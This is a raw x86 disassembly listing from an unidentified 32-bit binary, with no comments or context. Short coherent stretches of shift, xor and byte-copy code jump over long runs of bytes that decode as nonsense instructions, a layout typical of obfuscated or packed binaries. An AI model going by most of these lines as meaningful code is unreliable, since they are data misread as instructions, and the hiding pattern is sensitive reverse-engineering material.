  406d1c:	and    DWORD PTR [esi+ebp*8-0x4f],esi
  406d20:	dec    edi
  406d21:	(bad)  
  406d22:	out    0xb3,eax
  406d24:	pusha  
  406d25:	add    eax,0x8e84813d
  406d2a:	inc    eax
  406d2b:	dec    ebp
  406d2c:	test   eax,0xa21318e3
  406d31:	sub    bl,ch
  406d33:	push   esi
  406d34:	repnz and eax,0x8daff2e6
  406d3a:	jmp    0x23fe347f
  406d3f:	mov    dl,al
  406d41:	shl    ecx,0x1e
  406d44:	mov    ecx,DWORD PTR [ebp-0x14]
  406d47:	xor    edx,edx
  406d49:	or     eax,edx
  406d4b:	mov    cl,BYTE PTR [eax+ecx*1]
  406d4e:	mov    eax,DWORD PTR [ebp-0x34]
  406d51:	add    BYTE PTR [eax],cl
  406d53:	mov    eax,DWORD PTR [ebp-0x60]
  406d56:	mov    ecx,DWORD PTR [ebp-0x5c]
  406d59:	shrd   eax,ecx,0x2
  406d5d:	shr    ecx,0x2
  406d60:	mov    ecx,DWORD PTR [ebp-0x60]
  406d63:	mov    edx,DWORD PTR [ebp-0x5c]
  406d66:	xor    eax,edi
  406d68:	xor    edx,edx
  406d6a:	or     eax,edx
  406d6c:	lea    eax,[ebp+eax*1-0x4]
  406d70:	mov    DWORD PTR [ebp-0x34],eax
  406d73:	mov    eax,DWORD PTR [ebp-0x60]
  406d76:	shl    ecx,0x1e
  406d79:	mov    ecx,DWORD PTR [ebp-0x5c]
  406d7c:	shrd   eax,ecx,0x2
  406d80:	shr    ecx,0x2
  406d83:	mov    ecx,DWORD PTR [ebp-0x60]
  406d86:	mov    edx,DWORD PTR [ebp-0x5c]
  406d89:	xor    eax,edi
  406d8b:	xor    edx,edx
  406d8d:	or     eax,edx
  406d8f:	mov    edx,DWORD PTR [ebp+0x14]
  406d92:	shl    ecx,0x1e
  406d95:	mov    ecx,DWORD PTR [ebp-0x14]
  406d98:	mov    cl,BYTE PTR [eax+ecx*1]
  406d9b:	mov    eax,DWORD PTR [ebp-0x34]
  406d9e:	or     BYTE PTR [eax],cl
  406da0:	mov    eax,DWORD PTR [ebp+0x10]
  406da3:	jmp    0x407181
  406da8:	fcmovnb st,st(6)
  406daa:	int3   
  406dab:	xchg   edi,eax
  406dac:	lods   al,BYTE PTR ds:[esi]
  406dad:	jnp    0x406dc9
  406daf:	sbb    cl,BYTE PTR [edi+0x576a0603]
  406db5:	ss out 0xaa,eax
  406db8:	or     cl,BYTE PTR [ebx+0x129e1818]
  406dbe:	sbb    BYTE PTR [eax],bl
  406dc0:	leave  
  406dc1:	arpl   WORD PTR [edi+0x29],dx
  406dc4:	xchg   DWORD PTR [ebx+0x77d1b5bb],edx
  406dca:	adc    BYTE PTR [edi-0x73],0xb6
  406dce:	dec    esi
  406dcf:	retf   0xae37
  406dd2:	or     DWORD PTR [edx+edx*4-0x1ad727b1],0xc82da6ce
  406ddd:	jb     0x406e5c
  406ddf:	push   eax
  406de0:	out    0x50,eax
  406de2:	iret   
  406de3:	imul   ebx,DWORD PTR [esi],0x11
  406de6:	stos   DWORD PTR es:[edi],eax
  406de7:	xchg   ebp,eax
  406de8:	hlt    
  406de9:	jne    0x406ddf
  406deb:	into   
  406dec:	pop    ebx
  406ded:	int    0x22
  406def:	imul   DWORD PTR [ebx]
  406df1:	stc    
  406df2:	out    dx,al
  406df3:	pop    esp
  406df4:	mov    ecx,0xcfe8aaf9
  406df9:	inc    edi
  406dfa:	int3   
  406dfb:	or     ecx,DWORD PTR [eax-0x1be36d82]
  406e01:	push   0x68e1b090
  406e06:	cmp    ah,BYTE PTR ds:0xff31771e
  406e0c:	fstp   TBYTE PTR [edi-0x55af987e]
  406e12:	in     al,dx
  406e13:	pop    ecx
  406e14:	data16 je 0x406e22
  406e17:	imul   edi,DWORD PTR [esi+edi*8-0x529fd89],0xffffff8d
  406e1f:	cdq    
  406e20:	fmul   st,st(6)
  406e22:	outs   dx,BYTE PTR ds:[esi]
  406e23:	(bad)  
  406e24:	push   ss
  406e25:	cmp    DWORD PTR [ebx],edi
  406e27:	ins    DWORD PTR es:[edi],dx
  406e28:	or     esi,DWORD PTR [eax-0x6a62a4dc]
  406e2e:	int3   
  406e2f:	mov    ds:0x27a9c5f2,al
  406e34:	ins    BYTE PTR es:[edi],dx
  406e35:	push   ebp
  406e36:	(bad)  [ecx+0x1a0aa489]
  406e3c:	cmc    
  406e3d:	imul   eax,DWORD PTR [ecx+0x259f54b],0xffffff9c
  406e44:	in     al,dx
  406e45:	mov    dh,0xe8
  406e47:	ja     0x406e59
  406e49:	inc    edi
  406e4a:	fs push eax
  406e4c:	nop
  406e4d:	jg     0x406e09
  406e4f:	inc    edx
  406e50:	cmp    cl,BYTE PTR ds:0x9bb144ef
  406e56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e57:	outs   dx,DWORD PTR ds:[esi]
  406e58:	jl     0x406ecd
  406e5a:	int3   
  406e5b:	cmp    al,0x97
  406e5d:	int3   
  406e5e:	mov    eax,ds:0x19113b3b
  406e63:	out    0x3d,al
  406e65:	add    eax,0xccbcd975
  406e6a:	jbe    0x406e8f
  406e6c:	loope  0x406e92
  406e6e:	call   0xa42c:0x55d6d290
  406e75:	jns    0x406edf
  406e77:	jnp    0x406eae
  406e79:	or     BYTE PTR [ecx+0x1715776a],ch
  406e7f:	test   edi,edx
  406e81:	adc    al,BYTE PTR [ecx]
  406e83:	loop   0x406edf
  406e85:	mov    ebx,0xf781084d
  406e8a:	das    
  406e8b:	out    dx,eax
  406e8c:	leave  
  406e8d:	loop   0x406ede
  406e8f:	dec    ebp
  406e90:	jg     0x406e8d
  406e92:	push   cs
  406e93:	out    0x76,eax
  406e95:	in     al,dx
  406e96:	jg     0x406efd
  406e98:	and    BYTE PTR [ecx-0x5f1fc280],dh
  406e9e:	xlat   BYTE PTR ds:[ebx]
  406e9f:	outs   dx,BYTE PTR ds:[esi]
  406ea0:	rol    BYTE PTR [esi-0x7b9eda39],0x28
  406ea7:	hlt    
  406ea8:	(bad)  
  406ea9:	pop    ds
  406eaa:	inc    ecx
  406eab:	(bad)  
  406ead:	add    al,0x9b
  406eaf:	imul   ebx,DWORD PTR [eax-0x2a],0x3915b2ca
  406eb6:	add    DWORD PTR [eax+0x2],ebx
  406eb9:	or     bl,BYTE PTR [edi+0x3d]
  406ebc:	sbb    al,0x52
  406ebe:	fidivr WORD PTR [esi-0x4751fe8c]
  406ec4:	(bad)  
  406ec5:	(bad)  
  406ec6:	enter  0x313e,0xfd
  406eca:	pop    edi
  406ecb:	pop    ss
  406ecc:	inc    edx
  406ecd:	int3   
  406ece:	cli    
  406ecf:	fcmovu st,st(0)
  406ed1:	jle    0x406ef8
  406ed3:	add    eax,0xe45dc892
  406ed8:	mov    edx,0x8978f01c
  406edd:	fimul  WORD PTR [esi-0x3789dbee]
  406ee3:	and    edx,eax
  406ee5:	add    eax,0x8b4ae6c2
  406eea:	lahf   
  406eeb:	loopne 0x406eaf
  406eed:	data16 or al,0x9
  406ef0:	pop    ds
  406ef1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ef2:	and    ebp,DWORD PTR [eax+eiz*8-0x3]
  406ef6:	test   DWORD PTR [ebp+0x7],ecx
  406ef9:	push   eax
  406efa:	mov    ds:0x971c0272,al
  406eff:	mov    ebx,0x799ee007
  406f04:	jbe    0x406eaf
  406f06:	sbb    ah,BYTE PTR ds:0xb0eebbcc
  406f0c:	pop    edx
  406f0d:	ins    BYTE PTR es:[edi],dx
  406f0e:	cmp    ebx,DWORD PTR [esi]
  406f10:	sbb    eax,0xb5bb0c06
  406f15:	add    DWORD PTR [edi+ecx*2-0x451f9dd8],0x3b
  406f1d:	shr    BYTE PTR [edx-0x47f752b9],1
  406f23:	dec    BYTE PTR [edx+edx*1-0x7b320c27]
  406f2a:	jp     0x406f42
  406f2c:	sbb    DWORD PTR [esi-0x6d],ecx
  406f2f:	clc    
  406f30:	mov    dl,0xab
  406f32:	push   eax
  406f33:	and    al,0x60
  406f35:	mov    esi,0xd754700e
  406f3a:	cmp    esp,edx
  406f3c:	call   ecx
  406f3e:	or     eax,0x78f05681
  406f43:	xor    BYTE PTR [ecx],ah
  406f45:	ret    0x5138
  406f48:	clc    
  406f49:	adc    esp,DWORD PTR [esp+esi*8]
  406f4c:	(bad)
  406f50:	mov    eax,0xd7d3b4c3
  406f55:	popf   
  406f56:	iret   
  406f57:	xchg   edi,eax
  406f58:	mov    dl,0x49
  406f5a:	in     eax,dx
  406f5b:	cmp    dh,BYTE PTR [edx]
  406f5d:	add    DWORD PTR [edi+0x3be41bd],ebp
  406f63:	imul   DWORD PTR [ebx+0x23]
  406f66:	(bad)  [ebx+0x2f]
  406f69:	pop    esp
  406f6a:	jmp    0x406f34
  406f6c:	repnz sbb edi,ebp
  406f6f:	mov    al,0xf1
  406f71:	or     esi,ecx
  406f73:	xchg   edx,eax
  406f74:	scas   eax,DWORD PTR es:[edi]
  406f75:	cmc    
  406f76:	xchg   esp,eax
  406f77:	(bad)  
  406f78:	mov    ebp,0x5238643a
  406f7d:	add    DWORD PTR [ebx-0x287322c7],edx
  406f83:	ins    DWORD PTR es:[di],dx
  406f85:	gs fwait
  406f87:	dec    ebp
  406f88:	lods   al,BYTE PTR ds:[esi]
  406f89:	pusha  
  406f8a:	add    DWORD PTR [eax+0x76],ebx
  406f8d:	fcomi  st,st(5)
  406f8f:	lods   al,BYTE PTR ds:[esi]
  406f90:	test   DWORD PTR ds:0x40eb4212,edx
  406f96:	pop    ebx
  406f97:	gs stos DWORD PTR es:[edi],eax
  406f99:	xchg   BYTE PTR [edi-0x6d9d916f],cl
  406f9f:	and    esi,DWORD PTR [edx-0x62fb034]
  406fa5:	xchg   esi,eax
  406fa6:	jmp    0x406f97
  406fa8:	push   esp
  406fa9:	cmp    DWORD PTR [ecx],0x66be53b4
  406faf:	psubd  mm0,QWORD PTR [edx]
  406fb2:	iret   
  406fb3:	mov    al,ds:0xa45d99d0
  406fb8:	popf   
  406fb9:	lods   al,BYTE PTR ds:[esi]
  406fba:	out    dx,al
  406fbb:	cmp    dl,0x4c
  406fbe:	outs   dx,BYTE PTR ds:[esi]
  406fbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fc0:	iret   
  406fc1:	add    eax,0xdae0c7c3
  406fc6:	enter  0x6f47,0xf8
  406fca:	ret    
  406fcb:	clc    
  406fcc:	or     BYTE PTR [eax+ecx*4-0x11b28556],0x16
  406fd4:	push   eax
  406fd5:	pop    es
  406fd6:	popa   
  406fd7:	cmp    eax,0x4f6e761e
  406fdc:	pop    eax
  406fdd:	mov    DWORD PTR [ebx+edi*4+0x5e],ecx
  406fe1:	jb     0x406fe8
  406fe3:	(bad)  
  406fe4:	jbe    0x407061
  406fe6:	xchg   edx,eax
  406fe7:	cmp    bh,BYTE PTR [ecx-0x2c50215f]
  406fed:	les    edx,FWORD PTR [edi+0x38]
  406ff0:	push   edx
  406ff1:	shl    DWORD PTR [ebx-0x6c102e9f],cl
  406ff7:	or     BYTE PTR [esi-0x56d2f517],bl
  406ffd:	popf   
  406ffe:	push   edx
  406fff:	mov    ?,WORD PTR [ebp-0x6cfde9cd]
  407005:	pop    esi
  407006:	sbb    eax,0x717a247e
  40700b:	inc    esp
  40700c:	adc    al,0x4f
  40700e:	mov    ebp,0xb0787b7d
  407013:	jmp    0x293903ec
  407018:	(bad)  
  407019:	arpl   WORD PTR [ecx+esi*4-0x1f],sp
  40701d:	mov    eax,0xdb7dc58b
  407022:	int3   
  407023:	aas    
  407024:	out    0xe0,eax
  407026:	nop
  407027:	hlt    
  407028:	ss jp  0x406fbd
  40702b:	daa    
  40702c:	test   eax,0xe0b8af2a
  407031:	and    BYTE PTR [esp+eax*4-0x46680bc1],ch
  407038:	ins    DWORD PTR es:[edi],dx
  407039:	loopne 0x406fce
  40703b:	jg     0x407038
  40703d:	jl     0x406fcb
  40703f:	or     DWORD PTR [ebx+esi*1],esi
  407042:	jnp    0x407050
  407044:	sub    BYTE PTR [ebx],ch
  407046:	loop   0x4070ad
  407048:	lods   eax,DWORD PTR ds:[esi]
  407049:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40704a:	test   DWORD PTR [edi-0x47],ebp
  40704d:	fdivr  DWORD PTR [eax]
  40704f:	outs   dx,DWORD PTR ds:[esi]
  407050:	sub    eax,0xc0248c21
  407055:	dec    eax
  407056:	sbb    edi,DWORD PTR [ebp-0x7fe51623]
  40705c:	mov    al,ds:0xadda64af
  407061:	inc    ebp
  407062:	mov    eax,0xb6dbb1ba
  407067:	aas    
  407068:	not    BYTE PTR gs:[esi]
  40706b:	xchg   esi,eax
  40706c:	lods   eax,DWORD PTR ds:[esi]
  40706d:	jg     0x40707f
  40706f:	inc    ebp
  407070:	push   esi
  407071:	scas   al,BYTE PTR es:[edi]
  407072:	xchg   ebx,eax
  407073:	add    dh,ch
  407075:	out    dx,al
  407076:	jle    0x40702a
  407078:	std    
  407079:	pusha  
  40707a:	sbb    esi,DWORD PTR [ebp-0x3360448]
  407080:	pop    ebp
  407081:	jno    0x4070d6
  407083:	cmp    BYTE PTR [ebx+0x36],bl
  407086:	ja     0x40707a
  407088:	and    al,0x5c
  40708a:	jne    0x407076
  40708c:	les    edx,FWORD PTR [edi-0x9]
  40708f:	sbb    ah,BYTE PTR [ebp+0x3b]
  407092:	aad    0xdc
  407094:	repz repnz lea edi,[edi]
  407098:	sbb    eax,0x43d6956b
  40709d:	inc    esp
  40709e:	mov    ch,0x13
  4070a0:	inc    esi
  4070a1:	xlat   BYTE PTR ds:[ebx]
  4070a2:	inc    edx
  4070a3:	xchg   ecx,eax
  4070a4:	inc    ebp
  4070a5:	sbb    dh,ah
  4070a7:	ss cmc 
  4070a9:	clc    
  4070aa:	or     eax,0x1a46226e
  4070af:	cmp    BYTE PTR [esi-0x63e7084e],ch
  4070b5:	js     0x40712a
  4070b7:	and    esp,esi
  4070b9:	(bad)  
  4070ba:	sub    BYTE PTR [ebp+0x72],bl
  4070bd:	adc    eax,0xc3c24471
  4070c2:	arpl   si,ax
  4070c4:	imul   esi,DWORD PTR [ebp+eax*1-0x21],0xd6752ce9
  4070cc:	inc    esp
  4070cd:	(bad)  
  4070cf:	and    ah,ch
  4070d1:	dec    edi
  4070d2:	adc    esp,DWORD PTR [edx]
  4070d4:	adc    DWORD PTR [ebp+0x19],ebp
  4070d7:	fst    QWORD PTR [ecx+0x31cae906]
  4070dd:	pop    ss
  4070de:	popf   
  4070df:	das    
  4070e0:	sub    eax,0x3d82cebd
  4070e5:	test   al,dl
  4070e7:	xchg   edx,eax
  4070e8:	dec    esp
  4070e9:	push   ss
  4070ea:	in     eax,0x30
  4070ec:	inc    edx
  4070ed:	cdq    
  4070ee:	mov    al,ds:0x9660bced
  4070f3:	bound  ecx,QWORD PTR [edi]
  4070f5:	out    dx,eax
  4070f6:	dec    ebx
  4070f7:	fdiv   QWORD PTR [edx+0x4d127ef3]
  4070fd:	retf   
  4070fe:	leave  
  4070ff:	and    edx,DWORD PTR [ebx-0x545ac471]
  407105:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407106:	fwait
  407107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407108:	addr16 enter 0xd3bc,0xcc
  40710d:	xchg   ebp,eax
  40710e:	jmp    0x9aa8:0xfa036ab7
  407115:	dec    ebp
  407116:	add    eax,0xf2e34364
  40711b:	mov    dl,0x67
  40711d:	cs sbb DWORD PTR cs:[edx],ecx
  407121:	jo     0x407143
  407123:	ret    0xf80b
  407126:	push   DWORD PTR [edi+0x18bd4acf]
  40712c:	mov    ebp,DWORD PTR [ecx-0x211936e0]
  407132:	adc    al,al
  407134:	inc    esi
  407135:	mov    ebx,0xac573211
  40713a:	pop    ds
  40713b:	xor    BYTE PTR [ecx-0x6e407b23],0x51
  407142:	adc    edx,DWORD PTR [ecx-0x1c]
  407145:	in     al,0x57
  407147:	and    al,al
  407149:	adc    dh,cl
  40714b:	cmp    DWORD PTR [eax],0xdc5bc216
  407151:	rcl    ah,1
  407153:	sub    al,0x92
  407155:	out    0x44,al
  407157:	dec    ecx
  407158:	ins    DWORD PTR es:[edi],dx
  407159:	pop    ds
  40715a:	(bad)  
  40715b:	push   0x65
  40715d:	jmp    edi
  40715f:	aad    0xa2
  407161:	test   eax,0xfca3e081
  407166:	jbe    0x407103
  407168:	xor    eax,0x9a573060
  40716d:	(bad)  
  40716e:	ss int 0x72
  407171:	xchg   edx,eax
  407172:	cmp    esi,esi
  407174:	push   ebx
  407175:	pop    eax
  407176:	xchg   BYTE PTR [ebx-0x4697958d],ch
  40717c:	cwde   
  40717d:	xlat   BYTE PTR ds:[ebx]
  40717e:	cdq    
  40717f:	cmp    eax,DWORD PTR [edx]
  407181:	mov    ecx,eax
  407183:	shrd   ecx,edx,0x2
  407187:	shl    eax,0x1e
  40718a:	shr    edx,0x2
  40718d:	mov    DWORD PTR [ebp+0x14],edx
  407190:	mov    DWORD PTR [ebp+0x14],eax
  407193:	xor    edx,edx
  407195:	mov    eax,ecx
  407197:	xor    eax,edi
  407199:	or     eax,edx
  40719b:	mov    edx,DWORD PTR [ebp-0x4]
  40719e:	dec    eax
  40719f:	not    eax
  4071a1:	and    eax,edx
  4071a3:	xor    ecx,edi
  4071a5:	mov    DWORD PTR [ebp-0x4],eax
  4071a8:	mov    DWORD PTR [ebp+0x14],ecx
  4071ab:	xor    eax,eax
  4071ad:	or     DWORD PTR [ebp+0x14],eax
  4071b0:	mov    eax,DWORD PTR [ebp-0x50]
  4071b3:	jmp    0x407591
  4071b8:	fiadd  DWORD PTR [ecx-0x1d]
  4071bb:	mov    ah,BYTE PTR [edx]
  4071bd:	sub    bl,BYTE PTR [edx+0x21]
  4071c0:	jnp    0x407190
  4071c2:	mov    ch,0x7c
  4071c4:	add    ah,BYTE PTR [esi+0x59]
  4071c7:	stos   BYTE PTR es:[edi],al
  4071c8:	nop
  4071c9:	test   DWORD PTR [eax],ebx
  4071cb:	sbb    BYTE PTR [esi+0x19181812],bl
  4071d1:	and    al,0xf
  4071d3:	daa    
  4071d4:	adc    eax,0xdb475654
  4071d9:	xchg   esp,eax
  4071da:	push   0x5a
  4071dc:	fisttp WORD PTR [ecx-0x58]
  4071df:	pushf  
  4071e0:	aaa    
  4071e1:	loope  0x4071b8
  4071e3:	(bad)  
  4071e4:	ja     0x40723c
  4071e6:	ror    BYTE PTR [esi+0x76],1
  4071e9:	(bad)  
  4071ea:	sbb    ch,cl
  4071ec:	sub    edx,ebx
  4071ee:	or     cl,BYTE PTR [eax]
  4071f0:	and    eax,0xac7c8023
  4071f5:	dec    edx
  4071f6:	in     eax,0x6b
  4071f8:	pop    ebx
  4071f9:	jae    0x4071de
  4071fb:	xchg   si,ax
  4071fd:	addr16 sti 
  4071ff:	push   edi
  407200:	fs adc eax,0xe7be81bf
  407206:	pop    edx
  407207:	sub    al,0xfd
  407209:	in     eax,0xe
  40720b:	cmp    dl,BYTE PTR [edx+0x62]
  40720e:	das    
  40720f:	add    BYTE PTR [edi],ch
  407211:	mov    al,ds:0xba5f2509
  407216:	idiv   DWORD PTR [edx]
  407218:	shrd   DWORD PTR [ebx+0x1e],esi,0x64
  40721d:	iret   
  40721e:	leave  
  40721f:	or     al,0xd6
  407221:	fimul  DWORD PTR [edi-0x23c4085e]
  407227:	cld    
  407228:	mov    cl,0xdd
  40722a:	ds call 0x36fb:0x5c75d627
  407232:	sar    BYTE PTR [bx+si-0x74],cl
  407236:	push   ebx
  407237:	pop    esi
  407238:	jle    0x407283
  40723a:	sbb    eax,0xbe7773ee
  40723f:	ret    0x23d0
  407242:	inc    ecx
  407243:	fistp  DWORD PTR [eax+0x13]
  407246:	mov    esi,0xb5ae278e
  40724b:	loop   0x4071dd
  40724d:	mov    esi,0x89d1657f
  407252:	shr    BYTE PTR [ebx],cl
  407254:	mov    bh,0xa5
  407256:	test   DWORD PTR [ebp+edx*8-0xbd8515b],ecx
  40725d:	jae    0x407223
  40725f:	xlat   BYTE PTR ds:[ebx]
  407260:	mov    bl,0x95
  407262:	mov    ds:0x5932e7bb,eax
  407267:	jae    0x407282
  407269:	pushf  
  40726a:	adc    edi,esi
  40726c:	clc    
  40726d:	adc    bl,ah
  40726f:	outs   dx,DWORD PTR ds:[esi]
  407270:	pop    esi
  407271:	cmp    BYTE PTR [ebx+0x78599f96],ah
  407277:	in     al,0x6b
  407279:	or     al,BYTE PTR ss:[eax-0x2bfc397]
  407280:	ds addr16 rcl bl,1
  407284:	(bad)  
  407285:	fisttp DWORD PTR [eax]
  407287:	xchg   ebx,eax
  407288:	pop    esi
  407289:	call   0xcd0f:0x2e779cff
  407290:	xchg   ebp,eax
  407291:	pop    ebx
  407292:	and    dl,BYTE PTR [ebx-0x55]
  407295:	dec    edx
  407296:	dec    edx
  407297:	push   0xfffffffc
  407299:	xor    cl,BYTE PTR [eax+0x2813b5b8]
  40729f:	setae  BYTE PTR [edi]
  4072a2:	test   DWORD PTR [edx-0x79],ecx
  4072a5:	jle    0x40731c
  4072a7:	dec    ebx
  4072a8:	adc    bl,dl
  4072aa:	xor    bl,0xe6
  4072ad:	stos   BYTE PTR es:[edi],al
  4072ae:	mov    edx,esp
  4072b0:	inc    esi
  4072b1:	in     eax,0x2a
  4072b3:	xchg   ecx,eax
  4072b4:	(bad)  
  4072b5:	jg     0x40731c
  4072b7:	add    edx,DWORD PTR [edx+ebp*8]
  4072ba:	mov    eax,ds:0x4d2d5b8c
  4072bf:	add    DWORD PTR [eax-0x79b675c8],esi
  4072c5:	in     al,0x2d
  4072c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072c8:	or     eax,0xaa2673f5
  4072cd:	cmp    al,0x69
  4072cf:	adc    al,0xb
  4072d1:	xor    bh,bh
  4072d3:	jg     0x407311
  4072d5:	push   ss
  4072d6:	(bad)  [edi-0x1c]
  4072d9:	inc    edi
  4072da:	push   0xffffffcc
  4072dc:	(bad)  
  4072dd:	sub    eax,0x50579860
  4072e2:	mov    ds:0x43edf86a,eax
  4072e7:	es push ecx
  4072e9:	push   cs
  4072ea:	add    al,0xa
  4072ec:	pop    edi
  4072ed:	mov    ch,BYTE PTR [ecx-0x40]
  4072f0:	retf   0xace3
  4072f3:	clc    
  4072f4:	clc    
  4072f5:	mov    dl,0x3
  4072f7:	sub    cl,cl
  4072f9:	inc    ebx
  4072fa:	aaa    
  4072fb:	nop
  4072fc:	xor    edx,DWORD PTR [edi-0x47]
  4072ff:	adc    al,0xee
  407301:	in     eax,dx
  407302:	imul   eax,DWORD PTR [esi+esi*2+0x2a],0x7004856a
  40730a:	ffree  st(4)
  40730c:	xlat   BYTE PTR ds:[ebx]
  40730d:	hlt    
  40730e:	sbb    BYTE PTR [edi],0xd7
  407311:	pop    edx
  407312:	xchg   DWORD PTR [ebx+0x79],eax
  407315:	sub    edx,edi
  407317:	lock push ecx
  407319:	repz daa 
  40731b:	ret    0x7aee
  40731e:	jbe    0x4072f6
  407320:	mov    eax,0x4d8336df
  407325:	mov    eax,ds:0x8162f3fb
  40732a:	inc    ebp
  40732b:	(bad)  
  40732c:	jo     0x407336
  40732e:	mov    ebp,0xd42a39a4
  407333:	mov    edi,0xebbd576e
  407338:	test   DWORD PTR [ebp+0x9c2b49c],ebp
  40733e:	stos   BYTE PTR es:[edi],al
  40733f:	pop    ecx
  407340:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407341:	scas   eax,DWORD PTR es:[edi]
  407342:	mov    cl,0x32
  407344:	std    
  407345:	sub    DWORD PTR [esi+0x605afc1a],edi
  40734b:	and    al,0xce
  40734d:	int    0x4b
  40734f:	push   ebx
  407350:	mov    esi,0x71a48adb
  407355:	aaa    
  407356:	out    dx,eax
  407357:	retf   
  407358:	push   esi
  407359:	add    al,0xfc
  40735b:	mov    eax,0xacf2bd85
  407360:	jbe    0x407390
  407362:	jp     0x407300
  407364:	in     al,0x13
  407366:	test   bh,al
  407368:	ja     0x4073dd
  40736a:	ret    
  40736b:	xchg   edx,eax
  40736c:	jns    0x40738e
  40736e:	int3   
  40736f:	inc    edx
  407370:	xchg   ecx,eax
  407371:	sub    al,0x1f
  407373:	dec    ecx
  407374:	adc    DWORD PTR [edx-0x247f926b],ebx
  40737a:	inc    ebp
  40737b:	and    ebx,ebp
  40737d:	lock popa 
  40737f:	mov    ds:0x304a8fdb,eax
  407384:	jns    0x407333
  407386:	jp     0x40737a
  407388:	bound  ebp,QWORD PTR [eax-0x39]
  40738b:	mov    ds:0x8dbd57a0,eax
  407390:	imul   ecx,eax,0xa0cd84ed
  407396:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407397:	sbb    BYTE PTR [bp+di+0x543b],al
  40739c:	hlt    
  40739d:	sbb    BYTE PTR [ebp-0x2e],dl
  4073a0:	aad    0xc1
  4073a2:	ds and eax,0xa6f02184
  4073a8:	test   BYTE PTR [ebx-0x76],bl
  4073ab:	pop    ss
  4073ac:	in     al,0xe6
  4073ae:	imul   edx,DWORD PTR [ecx+0x566c99d9],0x67ebf0c7
  4073b8:	or     al,0xd9
  4073ba:	xchg   esi,eax
  4073bb:	test   BYTE PTR es:[esi+ebx*1],ah
  4073bf:	jae    0x407432
  4073c1:	mov    al,0xfc
  4073c3:	rcr    DWORD PTR [ebx-0x4f353451],0x7d
  4073ca:	das    
  4073cb:	mov    DWORD PTR ds:[edx],ebx
  4073ce:	das    
  4073cf:	pop    ds
  4073d0:	mov    edx,0x208f41d4
  4073d5:	idiv   esp
  4073d7:	xlat   BYTE PTR ds:[ebx]
  4073d8:	jb     0x40743f
  4073da:	dec    ebx
  4073db:	push   0x342ad9ad
  4073e0:	imul   esi,DWORD PTR [ecx],0x72
  4073e3:	mov    bh,cl
  4073e5:	dec    edi
  4073e6:	retf   0x73bf
  4073e9:	shl    BYTE PTR [edx],1
  4073eb:	cmc    
  4073ec:	sbb    DWORD PTR [ebx-0x4bdba41b],edx
  4073f2:	ret    
  4073f3:	pop    edx
  4073f4:	mov    bh,0x96
  4073f6:	pop    edi
  4073f7:	or     edx,DWORD PTR [edx+0x55249bdc]
  4073fd:	jmp    0x1b31:0xdee0415
  407404:	push   eax
  407405:	mov    edx,0x1de05198
  40740a:	addr16 mov dh,0xb0
  40740d:	mov    ch,dl
  40740f:	(bad)  
  407410:	fs cmc 
  407412:	bound  eax,QWORD PTR [esp+eiz*8-0x18d34f2a]
  407419:	jge    0x407408
  40741b:	cmp    BYTE PTR [ecx],ah
  40741d:	inc    esi
  40741e:	cvtpi2ps xmm4,QWORD PTR [ebx+0x76]
  407422:	xor    edi,esp
  407424:	mov    esi,0xa9576492
  407429:	xchg   esp,eax
  40742a:	xor    DWORD PTR [di],eax
  40742d:	or     esi,DWORD PTR [eax+0x25f9d84e]
  407433:	cwde   
  407434:	jbe    0x4074ab
  407436:	fisub  DWORD PTR [edx-0x238c4eac]
  40743c:	or     BYTE PTR ds:0x3d759f06,bh
  407442:	jae    0x4073f5
  407444:	sbb    dl,BYTE PTR [ebp+0x21]
  407447:	mov    ds:0xf7c81e85,al
  40744c:	out    0xc,al
  40744e:	mov    bl,0xdd
  407450:	jb     0x407495
  407452:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407453:	and    cl,BYTE PTR [ecx-0x2a671721]
  407459:	jge    0x407421
  40745b:	lea    edx,[eax-0x180358b4]
  407461:	mov    bh,0xde
  407463:	inc    eax
  407464:	out    dx,eax
  407465:	jp     0x407464
  407467:	xchg   esp,eax
  407468:	cmp    BYTE PTR [edx],al
  40746a:	mov    dl,0x42
  40746c:	dec    ebx
  40746d:	mov    ds:0xa51f4d8,eax
  407472:	add    al,0x2a
  407474:	call   0xcfdd:0x530d1f10
  40747b:	xchg   esi,esi
  40747d:	jmp    0x9443:0x45911ac
  407484:	out    0x67,al
  407486:	stc    
  407487:	xchg   ecx,eax
  407488:	aam    0x91
  40748a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40748b:	int    0x11
  40748d:	push   eax
  40748e:	sar    DWORD PTR [eax+edx*1+0x344d0b52],1
  407495:	pop    ebp
  407496:	mov    dl,0x29
  407498:	push   eax
  407499:	and    al,0x2d
  40749b:	and    edx,ecx
  40749d:	add    al,BYTE PTR [ebp-0x320ee4ee]
  4074a3:	mov    dh,0x95
  4074a5:	mov    bl,0x48
  4074a7:	(bad)  
  4074a8:	mov    al,0x4e
  4074ab:	mov    BYTE PTR [edi],cl
  4074ad:	adc    ah,dl
  4074af:	addr16 inc esi
  4074b1:	call   eax
  4074b3:	adc    eax,0x33fdfa53
  4074b8:	imul   esp,ebp,0xdf85b826
  4074be:	pop    esp
  4074bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074c0:	mov    al,ds:0x9fde0a11
  4074c5:	xor    eax,0x2309eca
  4074ca:	lock out 0x2c,al
  4074cd:	and    ch,0x21
  4074d0:	cmp    DWORD PTR [edi+eax*1],edx
  4074d3:	mov    eax,ds:0x1c162202
  4074d8:	mov    bl,0xf8
  4074da:	xchg   ebx,eax
  4074db:	jae    0x407519
  4074dd:	int    0x2b
  4074df:	dec    ecx
  4074e0:	or     eax,0xcec0d0e4
  4074e5:	in     al,0x5c
  4074e7:	and    dh,BYTE PTR [ecx+0x78]
  4074ea:	(bad)  
  4074eb:	xor    al,0xc1
  4074ed:	jl     0x40752d
  4074ef:	in     eax,dx
  4074f0:	sub    BYTE PTR [esi],ah
  4074f2:	push   esi
  4074f3:	daa    
  4074f4:	stos   DWORD PTR es:[edi],eax
  4074f5:	inc    ebx
  4074f6:	repnz xchg esp,eax
  4074f8:	pop    es
